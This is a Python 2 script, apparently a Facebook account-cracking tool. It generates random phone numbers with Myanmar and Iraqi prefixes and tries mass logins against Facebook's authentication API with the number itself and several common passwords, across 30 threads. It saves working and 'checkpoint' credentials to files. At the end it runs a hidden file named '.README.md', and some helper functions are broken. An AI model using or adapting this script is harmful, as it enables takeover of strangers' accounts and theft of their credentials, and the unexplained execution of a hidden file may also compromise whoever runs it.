
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('No Module Named wget! type:pip2 install wget')

try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 FB.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
#br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;94mWaiting... \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
logo = """ 
\033[1;93m ███╗░░░███╗░█████╗░██████╗░███╗░░░███╗██╗░░░██╗  \033[1;91mB
\033[1;93m ████╗░████║██╔══██╗██╔══██╗████╗░████║██║░░░██║  \033[1;91mA
\033[1;92m ██╔████╔██║███████║██████╔╝██╔████╔██║██║░░░██║  \033[1;91mB
\033[1;92m ██║╚██╔╝██║██╔══██║██╔══██╗██║╚██╔╝██║██║░░░██║  \033[1;91mY
\033[1;91m ██║░╚═╝░██║██║░░██║██║░░██║██║░╚═╝░██║╚██████╔╝  \033[1;92mD R A G O N
\033[1;91m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░  
\033[1;92m →→→→→→→→→          New Version1.0　    ←←←←←←←←←←
\033[1;97m →→→→→→→→→　     Author: B4BY DR4G0N    ←←←←←←←←←←
\033[1;91m →→→→→→→→→   　    Creation: M4RMU      ←←←←←←←←←←
\033[1;96m →→→→→→→→→       тεcнησℓσgү вү мαямυ    ←←←←←←←←←←
\033[1;94m---------------------------------------------------
        """
logo2 = """                                                                     
\033[1;93m ███╗░░░███╗░█████╗░██████╗░███╗░░░███╗██╗░░░██╗  \033[1;91mB
\033[1;93m ████╗░████║██╔══██╗██╔══██╗████╗░████║██║░░░██║  \033[1;91mA
\033[1;92m ██╔████╔██║███████║██████╔╝██╔████╔██║██║░░░██║  \033[1;91mB
\033[1;92m ██║╚██╔╝██║██╔══██║██╔══██╗██║╚██╔╝██║██║░░░██║  \033[1;91mY
\033[1;91m ██║░╚═╝░██║██║░░██║██║░░██║██║░╚═╝░██║╚██████╔╝  \033[1;92mD R A G O N
\033[1;91m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░  

\033[1;97m →→→→→→→→→　     Author: B4BY DR4G0N    ←←←←←←←←←←
\033[1;91m →→→→→→→→→   　    Creation: M4RMU      ←←←←←←←←←←
\033[1;96m →→→→→→→→→       тεcнησℓσgү вү мαямυ    ←←←←←←←←←←
\033[1;94m---------------------------------------------------"""

CorrectUsername = 'M'
CorrectPassword = 'M'
os.system('clear')
print logo2
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1mTOOL USERNAME: ')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1mTOOL PASSWORD: ')
        if password == CorrectPassword:
            print '\x1b[1;92m[\xe2\x9c\x93] Tawawa  ' + username
            time.sleep(3)
            loop = 'false'
        else:
            print 'Pass Halaya'
    else:
        print 'User Halaya'

def lisensi():
    os.system('clear')
    menu()
def menu():
    os.system('clear')
    print logo
    print '\x1b[1;97m[1]\x1b[1;97m  MYANMAR'
    print '\x1b[1;97m[2]\x1b[1;97m  EQRT'
    print '\x1b[1;97m[3]\x1b[1;97m  SLEMANI'
    print '\x1b[1;97m[4]\x1b[1;97m  Kurdistan'
    print '\x1b[1;97m[5]\x1b[1;97m  FREE MODE \033[92m[No CP] \033[97m'
    print '\n\x1b[1;97m[0]  Exit            '
    print '\x1b[1;97m---------------------------------------------------------\n'
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;97mChoose an Option : \x1b[1;97m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo
        print '\x1b[1;97mAREA CODES ' + '\n'
        print '\x1b[1;97m770-771-772-97-74-960-96-752-69-254-26-78-782-68-44' + '\n'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE: ')
            k = '+959'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '2':
        os.system('clear')
        print logo
        print '\x1b[1;97mAREA CODES ' + '\n'
        print '\x1b[1;97m750-751-752-753-754-780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE: ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '3':
        os.system('clear')
        print logo
        print '\x1b[1;97mAREA CODES ' + '\n'
        print '\x1b[1;97m770-771-772-773-774\n'
        try:
            c = raw_input('\x1b[1;97mChoose  Code : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '4':
        os.system('clear')
        print logo
        print '\x1b[1;97mAREA CODES ' + '\n'
        print '\x1b[1;97m770-771-772-773-774-750-751-752-753-754-780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE: ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '5':
        os.system('clear')
        print logo
        print '\x1b[1;97mAREA CODES ' + '\n'
        print '\x1b[1;97m770-771-772-773-774-750-751-752-753-754-780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '0':
        menu()
    else:
        print '[!] Fill In Correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] ALL NUMBERS: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Crack krdnaka daste pekrd ')
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Tkaya chawarwan ba...')
    time.sleep(0.5)
    psb('[!] Bo Wastan Dne Toolaka Ctrl Z Dagra')
    time.sleep(0.5)
    print '\x1b[1;97m--------------------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('Xosh')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[SUCCESSFULLL]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHEKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[SUCCESSFULL]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass2 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHEKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass2 + '\n')
                cps.close()
                cpb.append(c + user + pass2)
            else:
                pass3 = '1234554321'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[SUCCESSFULL]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass3 + '\n')
                okb.close()
                oks.append(c + user + pass3)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHEKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass3 + '\n')
                cps.close()
                cpb.append(c + user + pass3)
            else:
                pass4 = '112233445566'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[SUCCESSFULL]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass4 + '\n')
                okb.close()
                oks.append(c + user + pass4)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[CHEKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass4 + '\n')
                cps.close()
                cpb.append(c + user + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total successfull/\x1b[1;96mcheckpoint : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')
if __name__ == '__main__':
    menu()
